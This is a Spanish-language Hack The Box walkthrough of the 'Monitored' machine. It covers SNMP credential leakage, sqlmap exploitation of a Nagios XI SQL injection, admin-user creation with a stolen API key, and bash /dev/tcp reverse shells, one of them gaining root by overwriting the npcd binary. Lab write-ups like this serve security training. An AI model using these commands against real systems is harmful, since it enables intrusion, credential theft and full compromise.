---
description: https://app.hackthebox.com/machines/Monitored
---

# 游릳 HTB - Monitored

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### **Enumeration**

**Establecer el objetivo**

Primero, establecemos el objetivo utilizando el comando settarget con la direcci칩n IP de la m치quina objetivo:

```bash
settarget 10.10.11.248 Monitored
```

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

\
**Ping de reconocimiento**

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n -R para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.248 -R
```

<figure><img src="../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

**Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones -p- para escanear todos los puertos, --open para mostrar solo los puertos abiertos, -sS para un escaneo de tipo TCP SYN, --min-rate 5000 para establecer la velocidad m칤nima de paquetes y -vvv para un nivel de verbosidad alto. Adem치s, utilizamos -n para desactivar la resoluci칩n de DNS, -Pn para no realizar el escaneo de ping, y -oG allPorts para guardar la salida en un archivo con formato Greppable:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n -Pn 10.10.11.248 -oG allPorts
```

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n -sCV para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con -p \_\_PORTS\_\_ (reemplazando \_\_PORTS\_\_ con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre targeted:

```bash
sudo nmap -sCV -p22,80,389,443,5667 10.10.11.248 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Para a침adir la entrada "10.10.11.248 nagios.monitored.htb" al archivo /etc/hosts, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.248 nagios.monitored.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP 10.10.11.245 asociada al nombre de host nagios.monitored.htb al archivo /etc/hosts de tu sistema.

#### Utilizando WhatWeb para Obtener Informaci칩n sobre el Objetivo

Para obtener m치s informaci칩n sobre nuestro objetivo, utilizamos la herramienta WhatWeb. Esta herramienta nos permite identificar tecnolog칤as web utilizadas en el servidor, como el sistema de gesti칩n de contenidos (CMS), el lenguaje de programaci칩n, los plugins y otras caracter칤sticas. Ejecutamos el siguiente comando:

```bash
whatweb http://nagios.monitored.htb > whatweb && cat whatweb -l java
```

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

### SNMP Enumeration con SNMPWalk&#x20;

En la fase de enumeraci칩n de SNMP (Simple Network Management Protocol) utilizando SNMPWalk, se realiza un escaneo de la red en busca de informaci칩n sobre dispositivos y sistemas. En este caso, se ejecut칩 el comando `snmpwalk -v2c -c public 10.10.11.248` para buscar informaci칩n sobre el sistema remoto. Luego, se utiliz칩 el comando `snmpwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.25.4.2.1.5` para obtener informaci칩n espec칤fica sobre los procesos en ejecuci칩n en el sistema.

La herramienta utilizada, SNMPWalk, recopila informaci칩n utilizando el protocolo SNMP, que es com칰nmente utilizado para gestionar dispositivos de red. En este caso, se identificaron las credenciales `svc` y `XjH7VCehowpR1xZB` relacionadas con alg칰n servicio o proceso en el sistema remoto. Estas credenciales podr칤an ser 칰tiles para posteriores fases de penetraci칩n en el sistema.

{% code overflow="wrap" %}
```bash
snmpwalk -v2c -c public 10.10.11.248
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

```bash
snmpwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.25.4.2.1.5
```

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

```
svc:XjH7VCehowpR1xZB
```

Para m치s detalles sobre el funcionamiento de SNMP y c칩mo realizar una enumeraci칩n efectiva, se puede consultar la gu칤a proporcionada en el enlace [https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp), as칤 como la referencia de los Object Identifiers (OIDs) utilizados en [https://oidref.com/1.3.6.1.2.1.25.4.2.1.5](https://oidref.com/1.3.6.1.2.1.25.4.2.1.5).

***

### Descubrimiento de directorios

\
En la fase de descubrimiento de directorios, se utilizan herramientas como WFuzz y Dirsearch para identificar posibles puntos de entrada o recursos ocultos en el sitio web objetivo. En este caso, se ejecut칩 un fuzzing con WFuzz en el directorio `/nagiosxi/` para obtener m치s informaci칩n sobre el objetivo.

El comando utilizado fue :

{% code overflow="wrap" %}
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
```
{% endcode %}

&#x20;Donde se especific칩 el archivo de lista de palabras `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt` para realizar el fuzzing en la URL proporcionada `$URL`. Este comando busca archivos y directorios comunes en el sitio web objetivo y muestra las respuestas que no sean c칩digo de estado 404 (not found).

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Posteriormente, se utiliz칩 Dirsearch con el comando:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>dirsearch -u https://nagios.monitored.htb/nagiosxi -e php,js,html,txt,bak,zip
</strong></code></pre>

&#x20;Para identificar directorios y archivos que puedan contener informaci칩n 칰til. En este caso, se encontraron los directorios `/api/` y `/api/v1/`, los cuales podr칤an ser puntos de entrada adicionales para investigar m치s a fondo.

<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

\
En la fase de b칰squeda de directorios dentro de `/v1/`, se utiliz칩 Dirsearch con el comando&#x20;

{% code overflow="wrap" %}
```basic
dirsearch -u https://nagios.monitored.htb/nagiosxi/api/v1/ -w /endpoints.txt
```
{% endcode %}

&#x20;para identificar posibles puntos de entrada adicionales. En este caso, se encontr칩 el directorio `/authenticate/` dentro de `/v1/`, el cual puede ser un endpoint de autenticaci칩n de la API.

Utilizamos este wordlist especial para API endpoints: [https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d)

Este hallazgo podr칤a ser crucial para avanzar en la penetraci칩n del sistema, ya que el endpoint `/authenticate/` podr칤a permitir la autenticaci칩n en la API y el acceso a funciones adicionales. Es importante analizar este endpoint con m치s detalle para determinar c칩mo se puede utilizar de manera segura y efectiva en el contexto del pentesting.

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

## Obteniendo auth\_token a trav칠s del endpoint /authenticate/

Se utiliz칩 la siguiente solicitud Curl para enviar las credenciales de autenticaci칩n al endpoint:

{% code overflow="wrap" %}
```bash
curl -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -L -d 'username=svc&password=XjH7VCehowpR1xZB'
```
{% endcode %}

* `-X POST`: Especifica que se realizar치 una solicitud POST.
* `-k`: Permite realizar la solicitud a un servidor con un certificado SSL no v치lido.
* `-L`: Sigue las redirecciones si la respuesta es un c칩digo de estado 3xx.
* `-d 'username=svc&password=XjH7VCehowpR1xZB'`: Env칤a los par치metros de usuario y contrase침a en el cuerpo de la solicitud.

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Gracias a las credenciales podemos obtener nuestro token que ser치 crucial m치s adelante.

## CVE-2023-40931 - Vulnerabilidad en NagiosXI

Al realizar una b칰squeda en Internet, encontr칠 informaci칩n sobre una vulnerabilidad conocida como CVE-2023-40931 que afecta a NagiosXI. Esta vulnerabilidad se puede explotar enviando una solicitud POST a `/nagiosxi/admin/banner_message-ajaxhelper.php` con los par치metros `action=acknowledge_banner_message&id=3&token=*******`.

[https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567)

### Intentamos explotar usando sqlmap

{% code overflow="wrap" %}
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=edb86549b9efd8635a672ed52daa56a26e00118" -p id

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Demostrando ser vulnerable por lo que procedemos a investigar...

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=" -p id -level=5 -risk=3 -D nagiosxi -tables

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&#x26;id=3&#x26;token=" -p id -level=5 -risk=3 -D nagiosxi -T xi_users -dump
</strong>
</code></pre>

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

### Creaci칩n de usuario mediante api\_key robada

Se consult칩 la documentaci칩n oficial de NagiosXI para aprender a crear un usuario a trav칠s de la API utilizando la api\_key. Se encontr칩 un ejemplo en un post del foro de soporte de Nagios que mostraba c칩mo hacerlo.

Se utiliz칩 la herramienta Curl para enviar una solicitud POST al endpoint `api/v1/system/user` con los par치metros necesarios para crear un nuevo usuario. Se incluyeron los par치metros `username`, `password`, `name`, `email`, y `auth_level=admin` para crear un usuario con privilegios de administrador.

{% code overflow="wrap" %}
```bash
curl -X POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=endglory&password=endglory&name=endglory&email=endglory@monitored.htb&auth_level=admin"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

## Ejecuci칩n de Reverse Shell en NagiosXI

Mientras exploraba el panel de NagiosXI, descubr칤 una p치gina interesante en la ruta `https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php`, donde es posible agregar un comando personalizado. Aprovechando esta funcionalidad, decid칤 intentar colar un reverse shell en el sistema.

### Agregar un Comando Personalizado

Acced칤 a la p치gina mencionada y col칠 mi reverse shell en el campo de comando. Utilic칠 el siguiente comando para establecer una conexi칩n de reverse shell con mi m치quina:

```bash
bash -i >& /dev/tcp/10.10.15.2/6666 0>&1
```

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

### Crear un Servicio para Ejecutar el Comando

Despu칠s de agregar el comando, me dirig칤 a la secci칩n de servicios en NagiosXI y cre칠 un nuevo servicio. En la configuraci칩n del servicio, establec칤 que se ejecute el comando personalizado que acababa de agregar.

<figure><img src="../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

### Escuchando la conexi칩n de Reverse Shell

Finalmente, inici칠 Netcat en mi m치quina local para escuchar la conexi칩n de reverse shell en el puerto especificado. Una vez que el servicio se ejecut칩 en el sistema remoto, logr칠 obtener acceso a la m치quina a trav칠s de la conexi칩n de reverse shell y obteniendo la primera flag user.txt :clap:

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Recuerda que puedes mejorar el UX de la shell con los siguientes tips:

{% content-ref url="../../others/shell-stability.md" %}
[shell-stability.md](../../others/shell-stability.md)
{% endcontent-ref %}





### Subimos y utilizamos LinEnum

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Descargo desde mi m치quina (a trav칠s de un servidor Python)  LinEnum.sh y le doy permisos de ejecuci칩n (chmod +x).

{% content-ref url="../../others/python-server.md" %}
[python-server.md](../../others/python-server.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Al utilizar LinEnum, descubrimos que algunos archivos en la carpeta `/usr/local/nagiosxi/scripts/` se ejecutan con permisos de root sin contrase침a. Investigando m치s a fondo, encontramos que el archivo `manage_services.sh` tiene un CVE que nos permite escalar privilegios.

El archivo `manage_services.sh` se utiliza para iniciar, detener y ver el estado de los servicios que se ejecutan en el sistema. Aparentemente, se ejecuta con privilegios de root y no solicita contrase침a, lo que nos permite ejecutar comandos con privilegios elevados.

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p><a href="https://blog.grimm-co.com/2021/11/escalating-xss-to-sainthood-with-nagios.html">https://blog.grimm-co.com/2021/11/escalating-xss-to-sainthood-with-nagios.html</a></p></figcaption></figure>

**Detener el Servicio NPCD**: Utilizaremos `manage_services.sh` para detener el servicio NPCD, que es uno de los servicios que se ejecutan con permisos de root.

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**Eliminar el Ejecutable NPCD**: Eliminaremos el ejecutable del servicio NPCD y crearemos un nuevo archivo con un reverse shell que nos permitir치 obtener una shell interactiva en nuestra m치quina.

**Reiniciar el Servicio NPCD**: Utilizaremos `manage_services.sh` para reiniciar el servicio NPCD, lo que ejecutar치 nuestro reverse shell como root.

```bash
rm /usr/local/nagios/bin/npcd
touch /usr/local/nagios/bin/npcd
chmod +x /usr/local/nagios/bin/npcd
echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.2/7777 0>&1'" >> /usr/local/nagios/bin/npcd
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
```

Al ejecutar estos comandos, detendremos el servicio NPCD, crearemos un nuevo archivo NPCD con un reverse shell y reiniciaremos el servicio NPCD, lo que ejecutar치 nuestro reverse shell como root, d치ndonos acceso completo al sistema.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
